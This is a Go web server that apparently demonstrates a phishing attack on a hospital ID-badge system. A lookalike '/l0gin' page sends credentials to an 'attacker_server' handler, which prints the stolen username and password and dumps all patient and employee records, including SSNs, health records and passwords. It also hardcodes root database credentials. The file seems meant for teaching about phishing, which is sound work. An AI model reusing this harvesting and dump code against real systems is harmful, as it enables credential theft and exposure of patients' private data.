package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/go-sql-driver/mysql"
)

var db *sql.DB
var host string

type Employee struct {
	id           int32
	firstname    string
	lastname     string
	password     string
	position     string
	badge_status bool
	ssn          int32
}

type Patient struct {
	id        int32
	firstname string
	lastname  string
	ssn       int32
	ehr       string
}

func login(w http.ResponseWriter, req *http.Request) {

	form := `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Login</title>
  </head>
  <body>
	<h1>Login to update your ID Badge</h1>
    <form action="/hospital_server" method="POST">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br>
      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
`
	fmt.Fprint(w, form)
}

func l0gin(w http.ResponseWriter, req *http.Request) {

	form := `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Login</title>
  </head>
  <body>
	<h1>Login to update your ID Badge</h1>
    <form action="/attacker_server" method="POST">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br>
      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
`
	fmt.Fprint(w, form)
}

func hospital_server(w http.ResponseWriter, req *http.Request) {
	fmt.Fprintf(w, "<head><meta charset=\"UTF-8\"><title>Hospital Server</title></head>")
	fmt.Fprint(w, "<h1>Hospital Server</h1>")
	err := req.ParseForm()
	if err != nil {
		http.Error(w, "Failed to parse form", http.StatusInternalServerError)
		return
	}

	username := req.Form["username"][0]

	// NOTE: given this is a demo, there are no actual login checks
	fmt.Fprintf(w, "<p>Successfully logged in as %s", username)
	update_db(username)
	fmt.Fprintf(w, "<h3>ID BADGE UPDATED SUCCESSFULLY</h3>")
}

func attacker_server(w http.ResponseWriter, req *http.Request) {
	fmt.Fprintf(w, "<head><meta charset=\"UTF-8\"><title>Attacker Server</title></head>")
	fmt.Fprint(w, "<h1>Attacker Server</h1>")
	err := req.ParseForm()
	if err != nil {
		http.Error(w, "Failed to parse form", http.StatusInternalServerError)
		return
	}

	username := req.Form["username"][0]
	password := req.Form["password"][0]

	// NOTE: given this is a demo, the hacker has instant full access to DB
	fmt.Fprintf(w, "<p>Successfully stole creds for %s</p>", username)
	fmt.Fprintf(w, "<p>Username = %s</p>", username)
	fmt.Fprintf(w, "<p>Password = %s</p>", password)
	fmt.Fprintf(w, "<h3>DUMPING DATABASE</h3>")
	hack_db()
}

func update_db(username string) {
	cfg := mysql.Config{
		User:   "root",
		Passwd: "root",
		Net:    "tcp",
		Addr:   host + ":3306", // docker inspect to get ip address
		DBName: "hospital_db",
	}
	// Get a database handle.
	var err error
	db, err = sql.Open("mysql", cfg.FormatDSN())
	if err != nil {
		log.Fatal(err)
	}

	pingErr := db.Ping()
	if pingErr != nil {
		log.Fatal(pingErr)
	}

	var employees []Employee

	// check status pre update
	fmt.Printf("Updating %s's ID Badge status\n", username)
	rows, err := db.Query("select id, firstname, lastname, badge_status from employees where lastname = (?)", username)
	if err != nil {
		fmt.Errorf("broken query")
	}
	defer rows.Close()

	for rows.Next() {
		var e Employee
		if err := rows.Scan(&e.id, &e.firstname, &e.lastname, &e.badge_status); err != nil {
			fmt.Errorf("error %v", err)
		}
		employees = append(employees, e)
	}

	if err := rows.Err(); err != nil {
		fmt.Errorf("error %v", err)
	}

	fmt.Printf("%+v\n", employees)

	// update status
	rows, err = db.Query("update employees set badge_status = true where lastname = (?)", username)
	if err != nil {
		fmt.Errorf("broken query")
	}
	defer rows.Close()

	// check status post update
	employees = nil
	rows, err = db.Query("select id, firstname, lastname, badge_status from employees where lastname = (?)", username)
	if err != nil {
		fmt.Errorf("broken query")
	}
	defer rows.Close()

	for rows.Next() {
		var e Employee
		if err := rows.Scan(&e.id, &e.firstname, &e.lastname, &e.badge_status); err != nil {
			fmt.Errorf("error %v", err)
		}
		employees = append(employees, e)
	}

	if err := rows.Err(); err != nil {
		fmt.Errorf("error %v", err)
	}

	fmt.Printf("%+v", employees)

}

func hack_db() {
	cfg := mysql.Config{
		User:   "root",
		Passwd: "root",
		Net:    "tcp",
		Addr:   host + ":3306", // docker inspect to get ip address
		DBName: "hospital_db",
	}
	// Get a database handle.
	var err error
	db, err = sql.Open("mysql", cfg.FormatDSN())
	if err != nil {
		log.Fatal(err)
	}

	pingErr := db.Ping()
	if pingErr != nil {
		log.Fatal(pingErr)
	}

	fmt.Println("Dumping hospital_db!")
	var patients []Patient
	var employees []Employee

	rows, err := db.Query("select * from patients")
	if err != nil {
		fmt.Errorf("broken query")
	}
	defer rows.Close()

	for rows.Next() {
		var p Patient
		if err := rows.Scan(&p.id, &p.firstname, &p.lastname, &p.ssn, &p.ehr); err != nil {
			fmt.Errorf("error %v", err)
		}
		patients = append(patients, p)
	}

	if err := rows.Err(); err != nil {
		fmt.Errorf("error %v", err)
	}

	rows, err = db.Query("select * from employees")
	if err != nil {
		fmt.Errorf("broken query")
	}
	defer rows.Close()

	for rows.Next() {
		var e Employee
		if err := rows.Scan(&e.id, &e.firstname, &e.lastname, &e.password, &e.position, &e.badge_status, &e.ssn); err != nil {
			fmt.Errorf("error %v", err)
		}
		employees = append(employees, e)
	}

	if err := rows.Err(); err != nil {
		fmt.Errorf("error %v", err)
	}

	fmt.Println("Employees")
	for _, emp := range employees {
		fmt.Printf("%+v\n", emp)
	}
	fmt.Println()
	fmt.Println("Patients")
	for _, pat := range patients {
		fmt.Printf("%+v\n", pat)
	}
}

func main() {

	host = os.Args[1]

	http.HandleFunc("/login", login)
	http.HandleFunc("/hospital_server", hospital_server)
	http.HandleFunc("/l0gin", l0gin)
	http.HandleFunc("/attacker_server", attacker_server)

	http.ListenAndServe(":8090", nil)
}
